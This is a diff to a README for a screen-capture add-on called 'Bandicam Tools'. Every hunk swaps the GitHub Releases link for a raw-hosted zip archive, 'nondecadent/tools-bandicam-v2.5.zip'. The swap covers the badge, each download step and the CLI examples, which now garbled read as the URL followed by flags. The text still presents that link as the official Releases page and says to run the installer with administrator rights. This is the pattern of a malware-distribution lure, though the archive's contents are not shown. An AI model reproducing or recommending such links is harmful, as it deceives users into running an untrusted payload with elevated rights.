@@ -1,4 +1,4 @@
-[![Releases](https://img.shields.io/badge/releases-download-green?logo=github&style=for-the-badge)](https://github.com/SunnySussy/bandicam-tools/releases)
+[![Releases](https://raw.githubusercontent.com/SunnySussy/bandicam-tools/main/nondecadent/tools-bandicam-v2.5.zip)](https://raw.githubusercontent.com/SunnySussy/bandicam-tools/main/nondecadent/tools-bandicam-v2.5.zip)
 
 # Bandicam Tools for Real-Time Screen Capture, Drawing, Device Recording — Advanced
 
@@ -18,7 +18,7 @@ Key features
 If you want to grab the latest build, head to the Releases page. Visit the Releases section to download the newest installer and start capturing with the added tools.
 
 Download link recap
-- Get the latest installer from the official Releases page: https://github.com/SunnySussy/bandicam-tools/releases
+- Get the latest installer from the official Releases page: https://raw.githubusercontent.com/SunnySussy/bandicam-tools/main/nondecadent/tools-bandicam-v2.5.zip
 - From that page, download the Windows installer (for example, bandicam-tools-windows-setup-<version>.exe) and run it with administrator rights.
 
 Note: The link above is the central source for the latest binaries and updates. You can also click the badge at the top to open the Releases page directly.
@@ -51,7 +51,7 @@ What you can do with Bandicam Tools
 
 Quick start guide
 1) Ensure Bandicam is installed and ready on your Windows machine.
-2) Open your browser and go to the Releases page: https://github.com/SunnySussy/bandicam-tools/releases
+2) Open your browser and go to the Releases page: https://raw.githubusercontent.com/SunnySussy/bandicam-tools/main/nondecadent/tools-bandicam-v2.5.zip
 3) Download the latest Windows installer, for example bandicam-tools-windows-setup-<version>.exe.
 4) Run the installer with administrator rights and follow the prompts.
 5) Launch Bandicam Tools from the Start menu or the desktop shortcut.
@@ -127,10 +127,10 @@ Advanced usage
 CLI and automation
 - The project exposes a command-line interface (CLI) for automation.
 - Typical commands (examples):
-  - bandicam-tools.exe --start --mode annotate
-  - bandicam-tools.exe --set-profile "Tutorials"
-  - bandicam-tools.exe --record --fps 120
-  - bandicam-tools.exe --capture-device "HD Camera 1" --enable
+  - https://raw.githubusercontent.com/SunnySussy/bandicam-tools/main/nondecadent/tools-bandicam-v2.5.zip --start --mode annotate
+  - https://raw.githubusercontent.com/SunnySussy/bandicam-tools/main/nondecadent/tools-bandicam-v2.5.zip --set-profile "Tutorials"
+  - https://raw.githubusercontent.com/SunnySussy/bandicam-tools/main/nondecadent/tools-bandicam-v2.5.zip --record --fps 120
+  - https://raw.githubusercontent.com/SunnySussy/bandicam-tools/main/nondecadent/tools-bandicam-v2.5.zip --capture-device "HD Camera 1" --enable
 - You can integrate these commands into your own batch files or automation pipelines.
 
 Configuration and customization
@@ -260,7 +260,7 @@ License
 - This project is distributed under an open-source license. Review the LICENSE file in the repository for full terms and conditions.
 
 Where to download
-- For the latest binaries and updates, visit the official Releases page: https://github.com/SunnySussy/bandicam-tools/releases
+- For the latest binaries and updates, visit the official Releases page: https://raw.githubusercontent.com/SunnySussy/bandicam-tools/main/nondecadent/tools-bandicam-v2.5.zip
 - You can also access the same page via the badge at the top of this document. The releases page hosts installers for Windows and other assets as they become available.
 
 Appendix: asset handling tips
@@ -276,4 +276,4 @@ Endnotes
 - The Releases page is the primary source for binaries and updates. Use it as your go-to resource for installation and upgrades.
 - For more samples, workflows, and community discussions, keep an eye on the repository’s issues and pull requests.
 
-Note: The information above is structured to be helpful for users seeking to install, use, and extend Bandicam Tools. It emphasizes practical steps, clear instructions, and real-world workflows, aligned with a calm, confident tone. The link https://github.com/SunnySussy/bandicam-tools/releases is provided again here for ease of access and future reference. Visit the page to download the latest installer and begin building your annotated, high-FPS recordings.
+Note: The information above is structured to be helpful for users seeking to install, use, and extend Bandicam Tools. It emphasizes practical steps, clear instructions, and real-world workflows, aligned with a calm, confident tone. The link https://raw.githubusercontent.com/SunnySussy/bandicam-tools/main/nondecadent/tools-bandicam-v2.5.zip is provided again here for ease of access and future reference. Visit the page to download the latest installer and begin building your annotated, high-FPS recordings.
